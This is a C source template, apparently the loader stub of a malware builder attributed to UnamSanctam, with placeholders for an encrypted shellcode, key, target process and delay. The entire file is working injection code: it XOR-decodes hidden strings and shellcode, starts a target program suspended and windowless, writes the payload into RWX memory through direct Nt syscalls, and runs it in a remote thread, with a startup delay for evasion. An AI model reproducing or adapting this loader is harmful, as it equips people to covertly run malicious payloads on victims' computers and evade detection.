#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <sys/types.h>
#include <syscalls.h>

/* Created by Unam Sanctam, https://github.com/UnamSanctam */

char* cipher(char* data, long dataLen) {
	char* key = "#KEY";
	int keyLen = strlen(key);
	char* output = (char*)malloc(sizeof(char) * dataLen+1);
	output[dataLen] = 0;
	for (int i = 0; i < dataLen; ++i) {
		output[i] = data[i] ^ key[i % keyLen];
	}
	return output;
}

int main(int argc, char **argv){
	Sleep(#DELAY * 1000);

	PROCESS_INFORMATION p_info;
	STARTUPINFO s_info;
	LPVOID apointer = NULL;
	SIZE_T size = #SHELLCODELENGTH;
	SIZE_T bytes = 0;
	HANDLE hThread;
	TCHAR buffer[MAX_PATH]={0};
	TCHAR injectpath[MAX_PATH + 1000];
	TCHAR args[MAX_PATH + 1000];

	ZeroMemory(&s_info, sizeof(s_info));
	ZeroMemory(&p_info, sizeof(p_info));
	s_info.cb = sizeof(s_info);

	if (GetModuleFileName(NULL, buffer, sizeof(buffer) / sizeof(*buffer)))
	{
		sprintf(injectpath, "%s\\%s", getenv(cipher("#ENV", #ENVLENGTH)), cipher("#TARGET", #TARGETLENGTH));
		sprintf(args, "\"%s\" \"%s\"", injectpath, #ARGS);
		if (CreateProcess(injectpath, args, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &s_info, &p_info)) {
			NtAllocateVirtualMemory(p_info.hProcess, &apointer, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
			if (apointer != NULL) {
				printf("[+]Got the address to write 0x%x\n", apointer);
				NtWriteVirtualMemory(p_info.hProcess, apointer, cipher("#SHELLCODE", #SHELLCODELENGTH), #SHELLCODELENGTH, &bytes);
				if (bytes) {
					NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, p_info.hProcess, apointer, apointer, FALSE, 0, 0, 0, NULL);
				}
				CloseHandle(p_info.hProcess);
				CloseHandle(p_info.hThread);
				return 1;
			}
		}
	}
	return 0;
}